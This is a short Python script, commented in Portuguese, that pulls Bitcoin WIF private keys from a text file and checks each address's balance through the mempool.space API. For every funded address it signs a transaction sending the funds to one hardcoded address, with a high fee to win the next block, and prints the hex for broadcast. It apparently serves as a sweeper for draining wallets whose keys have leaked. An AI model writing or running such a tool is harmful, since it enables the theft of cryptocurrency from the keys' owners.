import requests
import argparse
import re
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

def scan_and_liquidate_all():
    # 1. Extrair todas as chaves WIF do seu arquivo privatekeys.txt
    with open('privatekeys.txt', 'r') as f:
        content = f.read()
    
    # Busca padrões de chaves WIF (começando com L, K ou 5)
    wif_keys = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
    print(f"Total de chaves encontradas no arquivo: {len(wif_keys)}")

    for wif in wif_keys:
        try:
            key = Key(wif, network='bitcoin')
            addr = key.address()
            
            # 2. Consulta rápida de saldo
            url = f"https://mempool.space/api/address/{addr}/utxo"
            utxos = requests.get(url, timeout=5).json()
            
            if utxos:
                print(f"SALDO ENCONTRADO! Endereço: {addr} | Chave: {wif[:5]}...")
                
                # 3. Montar a liquidação para o endereço intermediário
                dest = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
                utxo = max(utxos, key=lambda x: x['value'])
                fee = 8000 # Taxa alta para garantir que entre no próximo bloco
                amount = utxo['value'] - fee
                
                if amount > 546:
                    tx = Transaction(network='bitcoin')
                    tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'])
                    tx.add_output(value=amount, address=dest)
                    tx.sign([wif])
                    
                    # Retorna o HEX para o Workflow transmitir
                    print(f"HEX_GEN:{tx.raw_hex()}")
        except:
            continue

if __name__ == "__main__":
    scan_and_liquidate_all()
